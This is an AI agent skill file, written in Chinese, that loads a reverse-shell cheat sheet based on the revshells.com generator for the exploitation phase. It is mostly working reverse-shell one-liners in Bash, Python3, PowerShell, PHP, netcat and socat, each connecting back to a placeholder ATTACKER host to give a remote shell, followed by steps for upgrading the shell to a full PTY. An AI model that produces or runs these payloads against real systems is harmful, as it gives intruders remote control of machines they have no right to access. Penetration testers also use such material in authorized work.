---
name: revshells
description: >
  此技能适用于用户询问关于"revshells"、"快速生成 bash、Python、PowerShell、PHP 等语言的编码反弹 shell 载荷"、"利用阶段的反弹 shell 一行命令生成"。反弹 shell 一行命令生成器（Web UI 和 CLI），支持 50+ 种 shell。
---

# RevShells

反弹 shell 一行命令生成器 — 50+ 种 shell、编码变体，Web UI 位于 revshells.com。

## 快速开始

```
# Web UI: https://revshells.com
# 填写：IP、端口、Shell 类型 → 复制一行命令

# 常用一行命令（替换 IP/PORT）：
```

## Shell 速查表

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh ATTACKER PORT
nc ATTACKER PORT | /bin/sh | nc ATTACKER PORT2

# Socat
socat tcp:ATTACKER:PORT exec:'/bin/bash',pty,stderr,setsid,sigint,sane
```

## 升级 Shell 为 PTY

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

## 资源文件

| 文件 | 加载时机 |
|------|----------|
| `references/` | 编码变体与 PTY 升级技术 |
